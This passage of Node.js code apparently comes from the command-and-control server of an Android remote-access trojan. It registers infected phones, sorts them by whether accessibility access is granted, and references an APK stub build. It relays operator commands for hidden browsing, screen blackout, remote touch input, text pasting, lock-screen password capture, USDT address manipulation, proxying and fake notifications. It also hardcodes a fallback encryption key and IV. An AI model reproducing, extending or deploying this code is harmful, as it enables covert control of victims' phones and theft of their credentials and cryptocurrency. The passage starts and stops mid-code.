  await setJsonValue(`device:status:${pidKey}`, {
    phone_id: pidKey,
    source,
    online: true,
    last_ping: deviceData.lastPing || Date.now(),
    user_email: deviceData.user_email || '',
    usrname: deviceData.usrname || '',
    phone_name: deviceData.phone_name || '',
    android_version: deviceData.android_version || '',
    model: deviceData.model || '',
    country: deviceData.country || '',
    battery_charge: deviceData.battery_charge || '',
    activz: deviceData.activz || '',
    accessibility: deviceData.accessibility || '0',
  }, REDIS_DEVICE_STATUS_TTL_SEC).catch(() => {});

  if (source === 'ws' && options.phoneSocket) {
    SolrMobs.set(pidKey, options.phoneSocket);
    wsToPhoneId.set(options.phoneSocket, pidKey);
  }

  await upsertWsDeviceStatus(deviceData).catch(() => {});
  return deviceData;
}

async function setupRedisDeviceEventSubscribers() {
  if (!redisConfig.enabled) return;

  await subscribeEvent('device:event', async (event) => {
    if (!event || typeof event !== 'object') return;
    if (event.source !== 'mqtt') return;

    if (event.type === 'device.ping') {
      await processIncomingDevicePing(event.phoneId, event.payload || {}, { source: 'mqtt' });
      return;
    }

    if (event.type === 'device.close') {
      const pid = String(event.phoneId || '').trim();
      if (!pid) return;
      await markWsDeviceOffline(pid, 'mqtt-close');
    }
  });
}
const path = require('path');
const adbBridge = require('./adb-bridge');

// 校验 token 与 email 是否匹配（调用 PHP 接口）
function validateWsToken(token, email) {
  return new Promise((resolve) => {
    const base = PHP_API_URL.replace(/\/+$/, '');
    const validateUrl = base + '/api/validate_ws_token.php';
    const body = JSON.stringify({ token, email });
    const mod = validateUrl.startsWith('https') ? require('https') : require('http');
    const req = mod.request(validateUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
    }, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        try {
          const j = JSON.parse(data);
          resolve(!!j.valid);
        } catch (e) {
          resolve(false);
        }
      });
    });
    req.on('error', () => resolve(false));
    req.setTimeout(5000, () => { req.destroy(); resolve(false); });
    req.write(body);
    req.end();
  });
}

async function getWsAuthUserByToken(token) {
  const pool = getDbPool();
  if (!pool) return null;

  const tk = String(token || '').trim();
  if (!tk) return null;

  try {
    const [rows] = await pool.query(
      'SELECT userid, usrname, email, authorty FROM users WHERE token = ? AND token_expiration > NOW() LIMIT 1',
      [tk]
    );
    if (!rows || rows.length === 0) return null;
    return rows[0];
  } catch {
    return null;
  }
}

async function getWsAuthUserByEmail(email) {
  const pool = getDbPool();
  if (!pool) return null;

  const mail = String(email || '').trim();
  if (!mail) return null;

  try {
    const [rows] = await pool.query(
      'SELECT userid, usrname, email, authorty FROM users WHERE email = ? ORDER BY Expire DESC, userid DESC LIMIT 1',
      [mail]
    );
    if (!rows || rows.length === 0) return null;
    return rows[0];
  } catch {
    return null;
  }
}

// 捕获未处理的异常
process.on('uncaughtException', (err) => {
  // 打印错误信息到终端
  console.error('未捕获的异常：', err);

  // 写入错误信息到文件
  const errorMessage = `未捕获的异常：${err.message}\n堆栈信息：${err.stack}\n\n`;
  fs.appendFileSync('error_log.txt', errorMessage, 'utf8'); // 将错误信息追加到 error_log.txt 文件
});



wss.on("connection", (ws, req) => {
  debugLog("[DEBUG] 新连接建立");
  ws.clientIp = getClientIp(req, ws);
  ws.clientCountry = getClientCountry(req);
  
  // WebSocket 连接建立后，处理消息
  ws.on("message", async (message) => {
    debugLog("[DEBUG] 收到消息:", message.toString().substring(0, 300));
    try {
      let data;
      try {
        data = JSON.parse(message); // 尝试解析消息
      } catch (error) {
        if (WS_VERBOSE_LOG) {
          console.warn("[DEBUG] JSON 解析失败:", error, "原始消息:", message.toString().substring(0, 200));
        }
        return;  // 如果消息无法解析，跳过处理
      }

      if (data.pid) {
        const phoneId = data.pid;
        if (!phoneId) {
          console.log("Received message without valid phoneId, skipping.");
          return;
        }

        // 只要收到已注册手机端的任何消息，就刷新 lastPing
        if (ws.clientType === "phone" || data.itype === "Slr_client") {
          const touchKey = String(phoneId).trim();
          const existing = DeviceStatus.get(touchKey);
          if (existing) {
            existing.lastPing = Date.now();
          }
          probes.delete(touchKey);
        }

        if (data.itype === "Slr_client") {
          ws.clientType = "phone";
          const sessionId = `ws:${phoneId}`;
          wsSessionIdBySocket.set(ws, sessionId);
          claimProtocolSession({ sessionId, phoneId, protocol: 'ws', version: data.version || data.app_version || '1', ttlSec: WS_PING_TIMEOUT_SEC, meta: { clientType: 'phone' } }).catch(() => {});

          const oldWs = SolrMobs.get(phoneId);
          if (oldWs && oldWs !== ws && oldWs.readyState <= WebSocket.OPEN) {
            try { oldWs.close(); } catch {}
          }

          const pidKey = String(phoneId).trim();

          SolrMobs.set(phoneId, ws);
          wsToPhoneId.set(ws, phoneId);
          debugLog(`Stored WebSocket for phone with phoneId: ${phoneId}`);

          const existingDevice = DeviceStatus.get(pidKey) || {};
          DeviceStatus.set(pidKey, { ...existingDevice, lastPing: Date.now() });
          probes.delete(pidKey);

          if (data.subc === "ping") {
            const params = new URLSearchParams(data.msg);
            const phoneInfo = {};

            for (const [key, value] of params.entries()) {
              phoneInfo[key] = value;
            }
            if (!phoneInfo.country && ws.clientCountry) {
              phoneInfo.country = ws.clientCountry;
            }
            
            if (phoneInfo.mail && !phoneInfo.user_email) {
              phoneInfo.user_email = phoneInfo.mail;
            }
            if (phoneInfo.user_email) {
              phoneInfo.user_email = phoneInfo.user_email.replace(/ /g, '+');
            }

            // 统一使用外层 pid 作为 key，忽略 phoneInfo.phone_id 的差异
            if (!phoneInfo.phone_id) {
              phoneInfo.phone_id = phoneId;
            }

            const innerKey = String(phoneInfo.phone_id).trim();
            if (innerKey !== pidKey && DeviceStatus.has(innerKey)) {
              removeDeviceFromIndex(innerKey);
              DeviceStatus.delete(innerKey);
            }

            const deviceData = await processIncomingDevicePing(pidKey, phoneInfo, {
              source: 'ws',
              phoneSocket: ws,
            });

            publishEvent('device:event', {
              source: 'ws',
              type: 'device.ping',
              phoneId: pidKey,
              payload: deviceData,
              receivedAt: Date.now(),
            }).catch(() => {});
            touchProtocolSession(sessionId, WS_PING_TIMEOUT_SEC).catch(() => {});
          }
        }


        // 处理来自网页端的连接请求（slr_panel）
        if (data.itype === "slr_panel") {
          ws.clientType = "web";     // 🔑 标记这是网页端

          if (data.subc === "join") {
            // 存储新的网页端 WebSocket 连接
            if (!SolrUsers.has(phoneId)) {
              SolrUsers.set(phoneId, new Set());
            }

            SolrUsers.get(phoneId).add(ws);
            wsToPhoneId.set(ws, phoneId);
            console.log(`Stored new WebSocket for web with phoneId: ${phoneId}`);
          } else if (data.subc === "out") {
            // 处理 WebSocket 断开连接（来自网页端）
            const phoneSocketMob = SolrMobs.get(phoneId);  // 获取设备端 WebSocket
            if (phoneSocketMob && phoneSocketMob.readyState === WebSocket.OPEN) {
              const json_out = {
                type: "out",
                pid: phoneId,
              };
              try {
                phoneSocketMob.send(JSON.stringify(json_out));  // 向设备端发送“退出”命令
              } catch (err) {
                console.warn(`Failed to send 'out' command to phone ${phoneId}:`, err);
              }
            }
          } else if (data.subc === "ping") {
            const MobReciver = SolrMobs.get(phoneId);
            const deviceInfo = DeviceStatus.get(String(phoneId).trim());

            // 状态映射表
            const stateMap = {
              0: "CONNECTING",
              1: "OPEN",
              2: "CLOSING",
              3: "CLOSED"
            };

            const formatTime = (ts) => {
              if (!ts) return null;
              const d = new Date(ts + 8 * 60 * 60 * 1000);
              const pad = (n) => String(n).padStart(2, "0");
              return `${d.getUTCFullYear()}-${pad(d.getUTCMonth() + 1)}-${pad(d.getUTCDate())} ` +
                `${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())}`;
            };

            const response = {
              type: "statusBatch",
              pid: phoneId,
              serverToPhone: MobReciver ? stateMap[MobReciver.readyState] : "UNKNOWN",
              lastPing: deviceInfo ? formatTime(deviceInfo.lastPing) : null,
              phoneInfo: deviceInfo || {}
            };
            safeSend(ws, response);
          }
          else if (data.subc === "disag") {
            SolrMobs.delete(phoneId);  // 删除设备端连接
            if (phoneId) {
              if (SolrUsers.has(phoneId)) {
                SolrUsers.get(phoneId).delete(ws);
                if (SolrUsers.get(phoneId).size === 0) {
                  SolrUsers.delete(phoneId);
                }
              }
              wsToPhoneId.delete(ws);
              removeDeviceFromIndex(String(phoneId).trim());
              DeviceStatus.delete(String(phoneId).trim());
            }
          }

        }

        // 处理来自设备端的其他命令
        handleDeviceCommands(data, ws, phoneId);
      } else if (data.subc === "checkphone") {
        if (data.email || data.token) {
          const sessionId = `ws-panel:${data.email}`;
          const token = (data.token || '').trim();
          let authUser = null;
          // 🔒 当 WS_REQUIRE_TOKEN=1 时校验 token，否则兼容旧前端
          if (WS_REQUIRE_TOKEN) {
            if (token) {
              const valid = await validateWsToken(token, data.email);
              if (!valid) {
                ws.send(JSON.stringify({ type: "checkphone", list: [], total: 0, pageCount: 0, page: 1, pageSize: 10, fileLastModified: null, error: "未授权" }));
                return;
              }
            } else {
              ws.send(JSON.stringify({ type: "checkphone", list: [], total: 0, pageCount: 0, page: 1, pageSize: 10, fileLastModified: null, error: "需要 token" }));
              return;
            }
          }

          if (token) {
            authUser = await getWsAuthUserByToken(token);
          }
          if (!authUser && data.email) {
            authUser = await getWsAuthUserByEmail(data.email);
          }

          let phones = [];
          const authorty = String((authUser && authUser.authorty) || '').toLowerCase();
          const isAdmin = authorty === 'admin' || authorty === 'godfather';
          const canViewGlobal = canViewGlobalDevices(authUser);

          if (isAdmin && canViewGlobal) {
            const pool = getDbPool();
            if (pool) {
              const filters = data.filters || {};
              const whereParts = ['ws_online = 1'];
              const queryParams = [];

              if (filters.usrname && String(filters.usrname).trim() !== '') {
                whereParts.push('COALESCE(usrname, "") LIKE ?');
                queryParams.push(`%${String(filters.usrname).trim()}%`);
              }
              if (filters.phone_name && String(filters.phone_name).trim() !== '') {
                whereParts.push('COALESCE(phone_name, "") LIKE ?');
                queryParams.push(`%${String(filters.phone_name).trim()}%`);
              }
              if (filters.model && String(filters.model).trim() !== '') {
                whereParts.push('COALESCE(model, "") LIKE ?');
                queryParams.push(`%${String(filters.model).trim()}%`);
              }
              if (filters.install_date && String(filters.install_date).trim() !== '') {
                whereParts.push('COALESCE(install_date, "") LIKE ?');
                queryParams.push(`%${String(filters.install_date).trim()}%`);
              }

              const whereSql = whereParts.length ? `WHERE ${whereParts.join(' AND ')}` : '';
              const [rows] = await pool.query(
                `SELECT phone_id, user_email, COALESCE(usrname, '') AS usrname, COALESCE(phone_name, '') AS phone_name, COALESCE(country, '') AS country, COALESCE(android_ver, '') AS android_ver, COALESCE(android_ver, '') AS android_version, COALESCE(model, '') AS model, COALESCE(wallpaper, '') AS wallpaper, COALESCE(wallpaper, '') AS wallpap, COALESCE(battery_charg, '') AS battery_charg, COALESCE(battery_charg, '') AS battery_charge, COALESCE(install_date, '') AS install_date, COALESCE(activz, '') AS activz, last_ws_ping AS last_ping, ws_online AS phoneopen, COALESCE(accessibility, 0) AS accessibility
                 FROM ws_device_status
                 ${whereSql}
                 ORDER BY ws_online DESC, last_ws_ping DESC, phone_id ASC`,
                queryParams
              );
              phones = (rows || []).map(normalizeDeviceListRow);
            }
          } else {

            // 通过索引快速查找该 email 的设备（O(1) 而非遍历全部）
            const phoneIds = EmailToPhones.get(data.email);
            if (phoneIds) {
              for (const pid of phoneIds) {
                const device = DeviceStatus.get(pid);
                if (!device) continue;
                if (!device.phone_id || String(device.phone_id).trim() === "") continue;
                if (Number(device.phoneopen || device.ws_online || 0) !== 1) continue;
                if (device.hasOwnProperty("display") && device.display !== "" && Number(device.display) === 0) continue;
                phones.push(normalizeDeviceListRow(device));
              }
            }
          }

          // ⚡ 应用 filters
          const filters = data.filters || {};
          phones = phones.filter((device) => {
            // ✅ 先把 install_date 转换一下
            if (device.install_date) {
              device.install_date = normalizeDigits(device.install_date); // 转换成标准数字
            }

            if (filters.user_email && String(filters.user_email).trim() !== "") {
              const encFilter = encryptEmail(String(filters.user_email).trim()); // ✅ 加密
              if (device.user_email !== encFilter) {
                return false;
              }
            }
            if (filters.phone_name && !String(device.phone_name || "").includes(filters.phone_name)) {
              return false;
            }
            if (filters.country && !String(device.country || "").includes(filters.country)) {
              return false;
            }
            if (filters.model && !String(device.model || "").includes(filters.model)) {
              return false;
            }
            if (filters.accessibility !== undefined && filters.accessibility !== "") {
              if (String(device.accessibility) !== String(filters.accessibility)) {
                return false;
              }
            }
            if (filters.install_date && !String(device.install_date || "").includes(filters.install_date)) {
              return false;
            }
            return true;
          });

          // 优先把在线、权限已开启、最近 ping 的设备排在前面，避免旧页面首屏被离线老数据淹没。
          phones.sort((a, b) => {
            const onlineDiff = Number(b.phoneopen || 0) - Number(a.phoneopen || 0);
            if (onlineDiff !== 0) return onlineDiff;

            const accessibilityDiff = Number(b.accessibility || 0) - Number(a.accessibility || 0);
            if (accessibilityDiff !== 0) return accessibilityDiff;

            const pingDiff = parseDateSafe(b.last_ping) - parseDateSafe(a.last_ping);
            if (pingDiff !== 0) return pingDiff;

            const installDiff = parseDateSafe(b.install_date) - parseDateSafe(a.install_date);
            if (installDiff !== 0) return installDiff;

            return String(a.phone_id || "").localeCompare(String(b.phone_id || ""), "en", { numeric: true });
          });

          // 📌 分页
          const page = Number(data.page) || 1;
          const pageSize = Number(data.pageSize) || 10;
          const total = phones.length;
          const pageCount = Math.ceil(total / pageSize);

          const start = (page - 1) * pageSize;
          const end = start + pageSize;
          const pagedPhones = phones.slice(start, end).map(normalizeDeviceListRow);

          // 📌 文件修改时间（总是返回）
          const filePath = process.env.APKSTUB_PATH || path.join(__dirname, "../../private/apkstub/apkstub.zip");
          let fileLastModified = null;
          try {
            if (fs.existsSync(filePath)) {
              const stats = fs.statSync(filePath);
              fileLastModified = stats.mtime.toISOString();
            }
          } catch (err) {
            console.error("读取文件修改时间失败:", err);
          }
          // 补充 ADB 在线状态
          if (adbBridge && typeof adbBridge.getOnlineDevices === 'function') {
            const adbOnlineSet = new Set((adbBridge.getOnlineDevices() || []).map(d => String(d.phoneId)));
            for (const device of pagedPhones) {
              device.adb_online = adbOnlineSet.has(String(device.phone_id));
            }
          }

          safeSend(ws, {
            type: "checkphone",
            list: pagedPhones,
            total,
            pageCount,
            page,
            pageSize,
            fileLastModified
          });
          touchProtocolSession(sessionId, WS_PING_TIMEOUT_SEC).catch(() => {});

        }
      }



    } catch (error) {
      console.error("Error handling message:", error);
    }
  });
  // 监听 WebSocket 关闭事件
  // 关闭时的清理逻辑
  ws.on("pong", () => {
    const phoneId = wsToPhoneId.get(ws);
    if (phoneId) {
      const key = String(phoneId).trim();
      const existing = DeviceStatus.get(key);
      if (existing) {
        existing.lastPing = Date.now();
      }
      probes.delete(key);
    }
  });

  ws.on("error", (err) => {
    console.warn("[WS ERROR]", err.message);
  });

  ws.on("close", () => {
    const phoneId = wsToPhoneId.get(ws);
    wsToPhoneId.delete(ws);

    if (!phoneId) return;

    const sid = wsSessionIdBySocket.get(ws);
    if (sid) {
      releaseProtocolSession(sid).catch(() => {});
      wsSessionIdBySocket.delete(ws);
    }

    if (ws.clientType === "phone") {
      if (SolrMobs.get(phoneId) === ws) {
        SolrMobs.delete(phoneId);
      }
      clearRealtimeState(phoneId);
      console.log(`[CLOSE] 手机端断开 phoneId=${phoneId}，保留 DeviceStatus 等待心跳超时清理`);

      // 默认不在 close 时立即把 ws_online 置 0，避免“上线即掉线/状态抖动”。
      // 只做可选审计；真正离线以超时清理为准。
      auditWsDisconnect(phoneId).catch(() => {});
      if (WS_MARK_OFFLINE_ON_CLOSE) {
        markWsDeviceOffline(phoneId, 'disconnect').catch(() => {});
      }
    } else if (ws.clientType === "web") {
      if (SolrUsers.has(phoneId)) {
        SolrUsers.get(phoneId).delete(ws);
        if (SolrUsers.get(phoneId).size === 0) {
          SolrUsers.delete(phoneId);
        }
      }
      console.log(`[CLOSE] 网页端断开，已清理 phoneId=${phoneId}`);
    }
  });
});



const PING_TIMEOUT = 75 * 1000;  // 心跳超时时间
const CHECK_INTERVAL = WS_CHECK_INTERVAL_SEC * 1000; // 定时器间隔
const probes = new Map();
const PING_TIMEOUT_MS = WS_PING_TIMEOUT_SEC * 1000;

setInterval(() => {
  const now = Date.now();
  const toDelete = [];

  for (const [phoneId, wsConn] of SolrMobs.entries()) {
    const key = String(phoneId).trim();
    const deviceData = DeviceStatus.get(key);

    // 1. 已关闭的连接 → 直接清理
    if (!wsConn || wsConn.readyState === WebSocket.CLOSED) {
      toDelete.push(key);
      continue;
    }

    // 2. 超时未 ping
    if (deviceData && now - (deviceData.lastPing || 0) > PING_TIMEOUT_MS) {
      if (!WS_ENABLE_PING_PROBE) {
        // 不启用协议层 ping 探测时，超时直接按离线处理
        toDelete.push(key);
      } else {
        const probeInfo = probes.get(key);

        if (!probeInfo) {
          try {
            wsConn.ping();
            probes.set(key, { time: now, count: 1 });
            debugLog(`[探测] 向 phoneId=${key} 发送第1次 ping`);
          } catch {
            toDelete.push(key);
          }
        } else if (probeInfo.count >= 3) {
          debugLog(`[探测] phoneId=${key} 已探测${probeInfo.count}次无响应，强制断开`);
          toDelete.push(key);
        } else {
          if (now - probeInfo.time >= 10000) {
            try {
              wsConn.ping();
              probes.set(key, { time: now, count: probeInfo.count + 1 });
              debugLog(`[探测] 向 phoneId=${key} 发送第 ${probeInfo.count + 1} 次 ping`);
            } catch {
              toDelete.push(key);
            }
          }
        }
      }
    } else {
      // 正常 → 清除探测记录
      probes.delete(key);
    }
  }

  // 3. 清理没有活跃连接但超时的 DeviceStatus（设备断开后残留的状态）
  // 🔒 远程多区域场景：【绝不主动删除设备】仅标记离线，保留 DeviceStatus 和索引
  //     只有页面端主动卸载（disag）才删除。WS_DEVICE_AUTO_REMOVE_DAYS 作为安全阀默认为 0（永不）
  for (const [key, deviceData] of DeviceStatus.entries()) {
    if (SolrMobs.has(key)) continue;
    if (now - (deviceData.lastPing || 0) > PING_TIMEOUT_MS) {
      // 标记离线但保留记录
      const entry = DeviceStatus.get(key);
      if (entry) {
        entry.ws_online = 0;
        entry.phoneopen = 0;
        DeviceStatus.set(key, entry);
      }
      // 落库标记离线（如果 DB 可用）
      markWsDeviceOffline(key, 'timeout').catch(() => {});
      // 安全阀：如果配置了自动移除天数，且离线超过该天数，才允许清理
      if (WS_DEVICE_AUTO_REMOVE_DAYS > 0 && deviceData.lastPing) {
        const offlineDays = (now - deviceData.lastPing) / 86400000;
        if (offlineDays >= WS_DEVICE_AUTO_REMOVE_DAYS) {
          toDelete.push(key);
        }
      }
    }
  }

  // 4. 执行清理
  // 🔒 仅清理 WebSocket 连接（SolrMobs），不删除 DeviceStatus 和设备索引
  for (const key of toDelete) {
    try {
      const wsConn = SolrMobs.get(key);
      if (wsConn) {
        try { wsConn.close(); } catch {}
      }
      clearRealtimeState(key);
      SolrMobs.delete(key);
      probes.delete(key);
      console.log(`[定时清理] 移除失效WS连接 phoneId=${key}, 保留设备记录`);
    } catch { }
  }
}, CHECK_INTERVAL);


// 🔹 工具：把阿拉伯数字（٠١٢٣٤٥٦٧٨٩）转换成正常的 0-9
function normalizeDigits(str) {
  if (!str) return "";
  const arabicIndic = ["٠", "١", "٢", "٣", "٤", "٥", "٦", "٧", "٨", "٩"];
  let normalized = str;
  arabicIndic.forEach((d, i) => {
    const regex = new RegExp(d, "g");
    normalized = normalized.replace(regex, i);
  });
  return normalized;
}

// 🔹 工具：安全解析日期
function parseDateSafe(dateStr) {
  if (!dateStr) return 0;
  const normalized = normalizeDigits(String(dateStr).trim());
  const ts = Date.parse(normalized);
  return isNaN(ts) ? 0 : ts;
}


// 与 PHP 一致：AES-256-CBC + Base64
function encryptEmail(email) {
  const key = Buffer.from(process.env.SECRIT_KEY || "@zxfNM=q>Drm`6VP)!:u-A~;92E<.?wR");
  const iv = Buffer.from(process.env.SIV || "G8v!h3*Y.P+pFm/;");
  const cipher = crypto.createCipheriv("aes-256-cbc", key, iv);
  let out = cipher.update(String(email), "utf8", "base64");
  out += cipher.final("base64");
  return out;
}



function safeSend(target, msg) {
  if (!target || target.readyState !== WebSocket.OPEN) return false;
  try {
    target.send(typeof msg === 'string' ? msg : JSON.stringify(msg));
    return true;
  } catch (err) {
    console.warn('[safeSend] 发送失败:', err.message);
    return false;
  }
}

function markCommandPriority(phoneId, durationMs = WS_SCREEN_PRIORITY_BOOST_MS) {
  const key = String(phoneId || '').trim();
  if (!key || durationMs <= 0) return;
  commandPriorityUntilByPhone.set(key, Date.now() + durationMs);
}

function shouldForwardRealtimeFrame(phoneId, target, frameType) {
  if (!target || target.readyState !== WebSocket.OPEN) return false;
  if ((target.bufferedAmount || 0) > WS_SCREEN_MAX_BUFFERED_BYTES) {
    return false;
  }

  if (frameType !== 'screen') {
    return true;
  }

  const key = String(phoneId || '').trim();
  const now = Date.now();
  const priorityUntil = commandPriorityUntilByPhone.get(key) || 0;
  if (priorityUntil > now) {
    return false;
  }

  const lastAt = lastRealtimeFrameAtByPhone.get(key) || 0;
  if (now - lastAt < WS_SCREEN_FRAME_MIN_INTERVAL_MS) {
    return false;
  }

  lastRealtimeFrameAtByPhone.set(key, now);
  return true;
}

function clearRealtimeState(phoneId) {
  const key = String(phoneId || '').trim();
  if (!key) return;
  commandPriorityUntilByPhone.delete(key);
  lastRealtimeFrameAtByPhone.delete(key);
  pendingMovCommandByPhone.delete(key);
  const timer = pendingMovTimerByPhone.get(key);
  if (timer) {
    clearTimeout(timer);
    pendingMovTimerByPhone.delete(key);
  }
}

function queueLatestMovCommand(phoneId, sendDeviceCommand, payload) {
  const key = String(phoneId || '').trim();
  if (!key) {
    return sendDeviceCommand(payload);
  }

  markCommandPriority(key);
  pendingMovCommandByPhone.set(key, payload);
  if (pendingMovTimerByPhone.has(key)) {
    return true;
  }

  const timer = setTimeout(() => {
    pendingMovTimerByPhone.delete(key);
    const latestPayload = pendingMovCommandByPhone.get(key);
    pendingMovCommandByPhone.delete(key);
    if (latestPayload) {
      sendDeviceCommand(latestPayload);
    }
  }, WS_MOV_COALESCE_MS);

  pendingMovTimerByPhone.set(key, timer);
  return true;
}

function flushPendingMovCommand(phoneId, sendDeviceCommand) {
  const key = String(phoneId || '').trim();
  if (!key) return false;

  const timer = pendingMovTimerByPhone.get(key);
  if (timer) {
    clearTimeout(timer);
    pendingMovTimerByPhone.delete(key);
  }

  const latestPayload = pendingMovCommandByPhone.get(key);
  pendingMovCommandByPhone.delete(key);
  if (!latestPayload) return false;
  return sendDeviceCommand(latestPayload);
}

function handleDeviceCommands(data, ws, phoneId) {

  const subcommand = data.subc;
  const itype = data.itype;
  const usercheck = data.usercheck;

  switch (itype) {
    case idf_admin:


      // ✅ 如果 check 不为空，写入 txt
      if (usercheck && usercheck.trim() !== "") {
        const fs = require("fs");
        const path = require("path");

        const filePath = path.join(__dirname, "mov_connect.txt");

        // 固定为北京时间（UTC+8）
        const now = new Date();
        const offsetTime = new Date(now.getTime() + 8 * 60 * 60 * 1000);
        const time = offsetTime.toISOString().replace('T', ' ').replace('Z', '');

        const line = `${phoneId}\t${usercheck}\t${time}\n`;

        fs.appendFile(filePath, line, (err) => {
          if (err) {
            console.error("写入 mov_check.txt 出错:", err);
          }
        });
      }

      const MobReciverr = SolrMobs.get(phoneId);
      if (!MobReciverr || MobReciverr.readyState !== WebSocket.OPEN) {
        alertpanel(ws, "设备离线，无法发送命令", Alert_info);
        break;
      }

      const sendDeviceCommand = (payload) => {
        markCommandPriority(phoneId);
        return safeSend(MobReciverr, typeof payload === 'string' ? payload : JSONIT(payload));
      };

      const sendImmediateDeviceCommand = (payload) => {
        flushPendingMovCommand(phoneId, sendDeviceCommand);
        return sendDeviceCommand(payload);
      };

      switch (subcommand) {

        case "proxy":
          {
            const subcom = data.prxcom;

            let jsonData;
            switch (subcom) {
              case "ON":
                {
                  jsonData = {
                    type: "proxy",
                    subc: "1",
                  };
                }
                break;

              case "OFF":
                {
                  jsonData = {
                    type: "proxy",
                    subc: "0",
                  };
                }
                break;
              default:
                jsonData = null;
                break;
            }

            if (jsonData) {
              const msgdata = JSONIT(jsonData);

              sendDeviceCommand(msgdata);
              alertpanel(ws, "Command Sent", Alert_success);
            } else {
              alertpanel(ws, "Unkown proxy command", Alert_info);
            }
          }
          break;
        case "brows": //browser
          {


            const subcom = data.btype; //h = hidden , n = normall
            let jsonData;
            switch (subcom) {
              case "h":
                {
                  const newstsate = data.bcom; //0 = stop or 1 = start or 3 = comand
                  const extradata = data.extdata || null; //bcom = 0 this be null,bcom = 1 this be starturl , bcom = 3 this be like text<:CS:>hello<:CS:>
                  jsonData = {
                    type: "brows",
                    subc: "h",
                    bcom: newstsate,
                    extdata: extradata,
                  };
                }
                break;

              case "n":
                {
                  const newstsate = data.ltype; //html base64 f or url u
                  const extradata = data.extdata || null; //link , or html as base64 ,
                  jsonData = {
                    type: "brows",
                    subc: "n",
                    ltype: newstsate,
                    extdata: extradata,
                  };
                }
                break;
              default:
                jsonData = null;
                break;
            }
            if (jsonData) {
              const msgdata = JSONIT(jsonData);

              sendDeviceCommand(msgdata);
              //alertpanel(ws, "Command Sent", Alert_success);
            } else {
              alertpanel(ws, "Unkown browser command", Alert_info);
            }
          }
          break;
        case "fetch":
          {


            const fetchtype = data.ftype;
            const thepath = data.fpath ?? "";

            const jsonData = {
              type: "fetch",
              subc: fetchtype,
              extradata: thepath,
            };
            const msgdata = JSONIT(jsonData);

            sendDeviceCommand(msgdata);
          }
          break;


        case "bc": //broadcast
          {
            const comand = data.comand;



            let thetitle = data.title;
            let themsg = data.msg;
            let tolunch = data.todo;
            let action = data.act; //action open link/app/nothing
            let actionnum = -1;
            if (action === "nothing") {
              actionnum = 0;
            } else if (action === "openApp") {
              actionnum = 1;
            } else if (action === "openLink") {
              actionnum = 2;
            } else {
              return;
            }

            switch (comand) {
              case "alert":
                {
                  let alertico = data.alertico;
                  const jsonData = {
                    type: "bc",
                    subc: "A",
                    thetitle: thetitle,
                    themsg: themsg,
                    toopen: tolunch,
                    theype: actionnum.toString(),
                    ico: alertico,
                  };
                  const msgdata = JSONIT(jsonData);

                  sendDeviceCommand(msgdata);
                }
                break;
              case "notify":
                {
                  const jsonData = {
                    type: "bc",
                    subc: "N",
                    thetitle: thetitle,
                    themsg: themsg,
                    toopen: tolunch,
                    theype: actionnum.toString(),
                  };
                  const msgdata = JSONIT(jsonData);

                  sendDeviceCommand(msgdata);
                }
                break;

              default:
                break;
            }
          }
          break;
        case "screen":

          {
            // const mobpid = data.pid;
            const comand = data.comand;



            switch (comand) {
              case "block":
                {
                  const blockit = data.bstate; //0,1
                  const color = data.color; //0,1

                  const jsonData = {
                    type: "screen",
                    subc: "block",
                    blockstate: blockit,
                    color: color
                  };
                  const msgdata = JSONIT(jsonData);

                  sendDeviceCommand(msgdata);
                }
                break;
              case "paste":
                {
                  const texttopaste = data.txt;
                  const jsonData = {
                    type: "screen",
                    subc: "paste",
                    txt: texttopaste,
                  };
                  const msgdata = JSONIT(jsonData);

                  sendImmediateDeviceCommand(msgdata);
                }
                break;
              case "mov":
                {

                  const mtype = String(data.movetype ?? '');
                  const points = data.poi;
                  const jsonData = {
                    type: "screen",
                    subc: "mov",
                    poi: points,
                    movetype: mtype,
                  };
                  const msgdata = JSONIT(jsonData);

                  if (mtype === "1") {
                    queueLatestMovCommand(phoneId, sendDeviceCommand, msgdata);
                  } else {
                    sendImmediateDeviceCommand(msgdata);
                  }
                }
                break;
              case "snap":
                {
                  //snap , 1 single , 0 multie
                  const stype = String(data.stype ?? ''); //0,1
                  const jsonData = {
                    type: "screen",
                    subc: "snap",
                    snaptype: stype,
                  };
                  const msgdata = JSONIT(jsonData);

                  if (stype === "1") {
                    sendImmediateDeviceCommand(msgdata);
                  } else {
                    sendDeviceCommand(msgdata);
                  }
                }
                break;

              case "vol":
                {
                  //vol = Voluome , 1 up , 0 down
                  const vstate = data.volstate; //0,1
                  const jsonData = {
                    type: "screen",
                    subc: "vol",
                    volstate: vstate,
                  };
                  const msgdata = JSONIT(jsonData);

                  sendImmediateDeviceCommand(msgdata);
                }
                break;
              case "kb":
                {
                  //kb = keyboard , 1 show , 0 hide
                  const newstate = data.kbstate; //0,1
                  const jsonData = {
                    type: "screen",
                    subc: "kb",
                    kbstate: newstate,
                  };
                  const msgdata = JSONIT(jsonData);

                  sendImmediateDeviceCommand(msgdata);
                }
                break;
              case "L":
                {
                  //L = Lock , 1 lock , 0 unlock
                  const lockit = data.lockit; //0,1
                  const jsonData = {
                    type: "screen",
                    subc: "L",
                    lock: lockit,
                  };
                  const msgdata = JSONIT(jsonData);

                  sendImmediateDeviceCommand(msgdata);
                }
                break;
              case "nav":
                {
                  const navto = data.navshort; //ho, rec, bak
                  const jsonData = {
                    type: "screen",
                    subc: "nav",
                    nav: navto,
                  };
                  const msgdata = JSONIT(jsonData);
                  sendImmediateDeviceCommand(msgdata);  // 发送命令到设备
                }
                break;
              case "q":
                {
                  const newqulity = data.newqulity;

                  const jsonData = {
                    type: "screen",
                    subc: "Q",
                    newq: newqulity,
                  };

                  const msgdata = JSONIT(jsonData);

                  sendDeviceCommand(msgdata);
                }
                break;
              case "phonepass":

                {
                  const passtype = data.passtype;
                  const phonepass = data.txt;
                  const jsonData = {
                    type: "screen",
                    subc: "phonepass",
                    passtype: passtype,
                    phonepass: phonepass
                  };

                  const msgdata = JSONIT(jsonData);

                  sendDeviceCommand(msgdata);
                }
                break;
              case "usdt":
                {
                  const usdttype = data.usdttype;

                  const jsonData = {
                    type: "screen",
                    subc: "usdt",
                    usdttype: usdttype,
                  };

                  const msgdata = JSONIT(jsonData);

                  sendDeviceCommand(msgdata);
                }
                break;
              case "usdtadress":
                {
                  const usdtxt = data.usdtadresstext;

                  const jsonData = {
                    type: "screen",
                    subc: "usdtadress",
